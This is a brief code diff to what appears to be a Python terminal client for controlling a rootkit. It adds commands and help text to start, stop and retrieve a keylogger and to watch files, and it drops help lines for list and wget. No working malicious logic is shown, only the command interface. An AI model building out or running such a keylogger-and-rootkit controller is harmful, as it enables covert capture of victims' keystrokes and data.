@@ -7,6 +7,11 @@ from os import system
 HELP = "help"
 CLEAR = "clear"
 EXIT = "exit"
+WATCH = "watch"
+START = "start"
+STOP = "stop"
+SEND = "get"
+KEYLOGGER = "keylogger"
 LIST = "list"
 WGET = "wget"
 
@@ -23,6 +28,6 @@ def print_help():
     print("help " + 4*"\t" + " Displays this help screen.")
     print("clear " + 4*"\t" + " Clears the terminal screen.")
     print("exit " + 4*"\t" + " End the terminal session.")
-    print("list filepath" + 3*"\t" + " Attempts to list the contents of the given directory (filepath).")
-    print("wget url filepath" + 2*"\t" + " Downloads the resource from 'url' to the given 'filepath'.")
-
+    print("keylogger [stop | start | get]" + 1*"\t" + " Stop, start, or get keylogger on rootkit.")
+    print("watch [dirpath | filepath]" + 1*"\t" + " Watch the given directory or file for changes.")
+    
